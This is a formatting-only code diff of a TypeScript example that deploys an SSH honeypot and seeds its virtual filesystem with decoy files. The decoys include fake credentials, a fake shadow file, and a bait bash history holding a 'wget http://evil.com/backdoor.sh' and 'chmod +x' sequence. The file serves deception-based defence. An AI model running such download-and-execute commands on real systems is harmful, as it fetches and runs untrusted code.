@@ -5,7 +5,7 @@
  * brute-force attempts, and generates audit reports.
  */
 
-import { HoneyPot, SshClient, VirtualShell, VirtualSshServer } from "../src";
+import {HoneyPot, SshClient, VirtualShell, VirtualSshServer} from "../src";
 
 // ── Deploy honeypot ───────────────────────────────────────────────
 console.log("--- Deploy honeypot ---");
@@ -18,24 +18,24 @@ const users = shell.getUsers()!;
 
 vfs.writeFile(
 	"/etc/passwd",
-	"root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000:Admin:/home/admin:/bin/bash",
+	"root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000:Admin:/home/admin:/bin/bash"
 );
 vfs.writeFile(
 	"/etc/shadow",
-	"root:!:19000:0:99999:7:::\nadmin:$6$salt$hash:19000:0:99999:7:::",
+	"root:!:19000:0:99999:7:::\nadmin:$6$salt$hash:19000:0:99999:7:::"
 );
 vfs.writeFile("/home/admin/.ssh/authorized_keys", "ssh-rsa AAAA... decoy-key");
 vfs.writeFile(
 	"/var/log/auth.log",
-	"Jan 1 00:00:00 honeypot sshd[1]: Server listening on 0.0.0.0 port 22",
+	"Jan 1 00:00:00 honeypot sshd[1]: Server listening on 0.0.0.0 port 22"
 );
 vfs.writeFile(
 	"/opt/credentials.txt",
-	"db_password=S3cretP@ss\napi_key=sk-fake-12345",
+	"db_password=S3cretP@ss\napi_key=sk-fake-12345"
 );
 vfs.writeFile(
 	"/root/.bash_history",
-	"cat /etc/shadow\nwget http://evil.com/backdoor.sh\nchmod +x backdoor.sh",
+	"cat /etc/shadow\nwget http://evil.com/backdoor.sh\nchmod +x backdoor.sh"
 );
 
 const honeypot = new HoneyPot(10000);
@@ -48,7 +48,7 @@ console.log("  - Audit logging: enabled");
 console.log("  - Anomaly detection: enabled");
 
 // ── Start SSH server ──────────────────────────────────────────────
-const ssh = new VirtualSshServer({ port: 0, shell });
+const ssh = new VirtualSshServer({port: 0, shell});
 const port = await ssh.start();
 
 // ── Simulate attacker activity ────────────────────────────────────
@@ -100,7 +100,7 @@ console.log("\n  Recent events:");
 const recent = honeypot.getRecent(10);
 for (const entry of recent) {
 	console.log(
-		`    [${entry.type}] ${entry.source}: ${JSON.stringify(entry.details).slice(0, 80)}`,
+		`    [${entry.type}] ${entry.source}: ${JSON.stringify(entry.details).slice(0, 80)}`
 	);
 }
 
